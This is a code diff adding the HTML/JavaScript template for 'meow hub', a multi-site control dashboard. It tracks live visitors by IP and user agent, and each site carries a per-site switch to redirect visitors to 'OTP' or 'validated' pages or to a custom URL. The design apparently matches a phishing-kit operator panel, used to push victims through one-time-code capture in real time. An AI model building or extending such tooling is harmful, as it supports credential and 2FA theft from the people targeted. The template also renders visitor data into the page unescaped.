@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="dark">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>meow hub — central panel</title>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#07090e;--card:#0f141c;--side:#0b0e14;--accent:#6366f1;--border:#1e2638;--muted:#8e9bb0}
+body{background:var(--bg);font-family:'Plus Jakarta Sans',sans-serif;color:#f1f5f9;min-height:100vh}
+.sidebar{width:250px;background:var(--side);border-right:1px solid var(--border);height:100vh;position:fixed;top:0;left:0;z-index:1000}
+.main{margin-left:250px;padding:2rem}
+.nav-link{color:var(--muted);border-radius:10px;padding:.7rem 1rem;margin-bottom:.35rem;font-weight:500}
+.nav-link:hover{color:#fff;background:rgba(255,255,255,.05)}
+.nav-link.active{color:#fff;background:linear-gradient(135deg,var(--accent),#4f46e5)}
+.stat-card,.site-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:1.4rem}
+.stat-card:hover,.site-card:hover{border-color:var(--accent)}
+.badge-live{background:rgba(34,197,94,.15);color:#22c55e;border:1px solid rgba(34,197,94,.3)}
+.badge-dead{background:rgba(142,155,176,.12);color:var(--muted)}
+.badge-redir{background:rgba(245,158,11,.15);color:#f59e0b;border:1px solid rgba(245,158,11,.3)}
+.form-control,.form-select{background:#080b12!important;border:1px solid var(--border)!important;color:#fff!important;border-radius:10px}
+.code{font-family:'Fira Code',monospace;font-size:.78rem}
+.live-dot{width:8px;height:8px;border-radius:50%;background:#22c55e;display:inline-block;animation:pulse 1.6s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+.sess-row{font-size:.78rem;border-bottom:1px solid rgba(255,255,255,.05)}
+</style>
+</head>
+<body>
+<div class="sidebar d-flex flex-column p-3">
+  <div class="d-flex align-items-center mb-4 px-2 pt-2">
+    <div class="p-2 rounded-3 me-3" style="background:rgba(99,102,241,.12)"><i class="fas fa-wave-square text-primary fs-4"></i></div>
+    <div><h5 class="fw-bold mb-0">meow hub</h5><span class="text-muted small">central panel</span></div>
+  </div>
+  <ul class="nav nav-pills flex-column mb-auto">
+    <li><a href="#dash" class="nav-link active spa" data-t="tab-dash"><i class="fas fa-chart-pie me-2"></i>Dashboard</a></li>
+    <li><a href="#sites" class="nav-link spa" data-t="tab-sites"><i class="fas fa-cubes me-2"></i>Sites</a></li>
+    <li><a href="#live" class="nav-link spa" data-t="tab-live"><i class="fas fa-signal me-2"></i>Live Users</a></li>
+  </ul>
+  <hr class="border-secondary opacity-25">
+  <div class="px-2 mb-3"><div class="d-flex align-items-center"><div class="live-dot me-2"></div><span class="fw-bold text-truncate">{{ user.username }}</span></div></div>
+  <a href="/logout" class="btn btn-outline-danger btn-sm py-2"><i class="fas fa-power-off me-1"></i> logout</a>
+</div>
+
+<div class="main">
+<div id="alert-box"></div>
+
+<!-- DASHBOARD -->
+<div id="tab-dash" class="spa-c">
+  <h3 class="fw-bold mb-1">Overview</h3><p class="text-muted small">Every site in the folder, live users, redirection state — one glance.</p>
+  <div class="row g-4 mt-1">
+    <div class="col-md-3"><div class="stat-card"><span class="text-muted small">SITES</span><h2 class="fw-bold mb-0" id="st-sites">0</h2></div></div>
+    <div class="col-md-3"><div class="stat-card"><span class="text-muted small">LIVE USERS</span><h2 class="fw-bold mb-0 text-success" id="st-live">0</h2></div></div>
+    <div class="col-md-3"><div class="stat-card"><span class="text-muted small">RUNNING APPS</span><h2 class="fw-bold mb-0" id="st-run">0</h2></div></div>
+    <div class="col-md-3"><div class="stat-card"><span class="text-muted small">TOTAL LAUNCHES</span><h2 class="fw-bold mb-0" id="st-total">0</h2></div></div>
+  </div>
+</div>
+
+<!-- SITES -->
+<div id="tab-sites" class="spa-c d-none">
+  <h3 class="fw-bold mb-1">Sites</h3><p class="text-muted small">Auto-discovered from the folder. Set a redirection mode, launch its app, or open it.</p>
+  <div class="row g-4 mt-1" id="sites-grid"></div>
+</div>
+
+<!-- LIVE USERS -->
+<div id="tab-live" class="spa-c d-none">
+  <h3 class="fw-bold mb-1">Live Users</h3><p class="text-muted small">Sessions with a heartbeat in the last 25 seconds. Auto-refreshes.</p>
+  <div id="live-list" class="mt-3"></div>
+</div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+const SITE_KEYS = {{ sites.keys()|list|tojson }};
+const SITE_META = {{ sites|tojson }};
+let REDIRECTS = {};
+
+// --- tab nav ---
+document.querySelectorAll('.spa').forEach(b=>b.addEventListener('click',e=>{
+  e.preventDefault();
+  document.querySelectorAll('.spa').forEach(x=>x.classList.remove('active'));
+  b.classList.add('active');
+  document.querySelectorAll('.spa-c').forEach(c=>c.classList.add('d-none'));
+  document.getElementById(b.dataset.t).classList.remove('d-none');
+}));
+
+function alert(msg,type){
+  document.getElementById('alert-box').innerHTML=
+   `<div class="alert alert-${type} border-0 alert-dismissible fade show">${msg}
+    <button type="button" class="btn-close" data-bs-dismiss="alert"></button></div>`;
+}
+
+function redirBadge(site){
+  const m=(REDIRECTS[site]||{}).mode||'none';
+  if(m==='none') return `<span class="badge badge-dead">no redirect</span>`;
+  return `<span class="badge badge-redir"><i class="fas fa-arrow-right-arrow-left me-1"></i>${m}</span>`;
+}
+
+function renderSites(per){
+  const g=document.getElementById('sites-grid');
+  g.innerHTML=SITE_KEYS.map(k=>{
+    const s=SITE_META[k], p=per[k]||{};
+    const live=p.live||0, running=p.running;
+    return `<div class="col-md-6 col-xl-4"><div class="site-card h-100">
+      <div class="d-flex justify-content-between align-items-start mb-2">
+        <h5 class="fw-bold mb-0 text-capitalize">${s.name}</h5>
+        <div>${redirBadge(k)}</div>
+      </div>
+      <div class="d-flex gap-3 mb-3">
+        <span class="code text-muted">/s/${k}/</span>
+        <span class="${live>0?'text-success':'text-muted'} small"><i class="fas fa-user me-1"></i>${live} live</span>
+        <span class="${running?'text-info':'text-muted'} small"><i class="fas fa-microchip me-1"></i>${running?'on':'off'}</span>
+      </div>
+      <div class="mb-3">
+        <label class="form-label text-muted small mb-1">redirection</label>
+        <div class="d-flex gap-2">
+          <select class="form-select form-select-sm" id="mode-${k}">
+            <option value="none">none (serve site)</option>
+            <option value="otp">switch to OTP</option>
+            <option value="validated">switch to validated</option>
+            <option value="custom">custom URL</option>
+          </select>
+          <button class="btn btn-sm btn-warning" onclick="setRedir('${k}')"><i class="fas fa-bolt"></i></button>
+        </div>
+        <input class="form-control form-control-sm mt-2 code" id="url-${k}" placeholder="https://… (custom mode)" style="display:none">
+      </div>
+      <div class="d-flex gap-2">
+        <a href="/s/${k}/" target="_blank" class="btn btn-outline-info btn-sm flex-fill"><i class="fas fa-eye me-1"></i>open</a>
+        ${s.has_app?`
+        <button class="btn btn-success btn-sm flex-fill" id="launch-${k}" onclick="launch('${k}')" ${running?'disabled':''}><i class="fas fa-play me-1"></i>${running?'running':'launch'}</button>
+        <button class="btn btn-danger btn-sm" onclick="stop('${k}')" ${running?'':'disabled'}><i class="fas fa-stop"></i></button>`:''}
+      </div>
+    </div></div>`;
+  }).join('');
+  SITE_KEYS.forEach(k=>{
+    const sel=document.getElementById('mode-'+k);
+    if(!sel) return;
+    sel.value=(REDIRECTS[k]||{}).mode||'none';
+    sel.addEventListener('change',()=>{
+      document.getElementById('url-'+k).style.display = sel.value==='custom'?'block':'none';
+    });
+    if(sel.value==='custom') document.getElementById('url-'+k).style.display='block';
+  });
+}
+
+async function setRedir(site){
+  const mode=document.getElementById('mode-'+site).value;
+  const url=document.getElementById('url-'+site).value.trim();
+  const r=await fetch('/api/redirect/'+site,{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({mode,url})});
+  const d=await r.json();
+  if(d.success){ REDIRECTS[site]=d.redirect; alert(`<span class="code">${site}</span> → <b>${mode}</b>`,`warning`); refresh(); }
+  else alert(d.message||'error','danger');
+}
+
+async function launch(site){
+  const r=await fetch('/api/launch/'+site,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({})});
+  const d=await r.json();
+  d.success?alert(`<span class="code">${site}</span> launched (pid ${d.pid})`,'success'):alert(d.message,'danger');
+  refresh();
+}
+async function stop(site){
+  const r=await fetch('/api/stop/'+site,{method:'POST'});
+  const d=await r.json();
+  d.success?alert(`<span class="code">${site}</span> stopped`,'warning'):alert(d.message,'danger');
+  refresh();
+}
+
+async function renderLive(){
+  const r=await fetch('/api/live'); const d=await r.json();
+  const box=document.getElementById('live-list');
+  const total=Object.values(d).reduce((a,s)=>a+s.count,0);
+  if(total===0){ box.innerHTML='<p class="text-muted">no live sessions.</p>'; return; }
+  box.innerHTML=Object.entries(d).filter(([k,v])=>v.count>0).map(([k,v])=>`
+    <div class="site-card mb-3">
+      <div class="d-flex justify-content-between mb-2">
+        <span class="fw-bold text-capitalize">${SITE_META[k]?SITE_META[k].name:k}</span>
+        <span class="text-success small"><span class="live-dot me-1"></span>${v.count} live</span>
+      </div>
+      ${v.sessions.map(s=>`<div class="sess-row d-flex justify-content-between py-1">
+        <span class="code text-muted">${s.ip}</span>
+        <span class="text-muted text-truncate mx-2" style="max-width:40%">${s.ua}</span>
+        <span class="code">in ${s.first} · ${s.duration_s}s</span>
+      </div>`).join('')}
+    </div>`).join('');
+}
+
+async function refresh(){
+  const r=await fetch('/api/stats'); const d=await r.json();
+  document.getElementById('st-sites').textContent=d.sites;
+  document.getElementById('st-live').textContent=d.live_users;
+  document.getElementById('st-run').textContent=d.running;
+  document.getElementById('st-total').textContent=d.total_launches;
+  REDIRECTS=Object.fromEntries(Object.entries(d.per_site).map(([k,v])=>[k,v.redirect]));
+  renderSites(d.per_site);
+  renderLive();
+}
+setInterval(refresh,4000);
+refresh();
+</script>
+</body>
+</html>
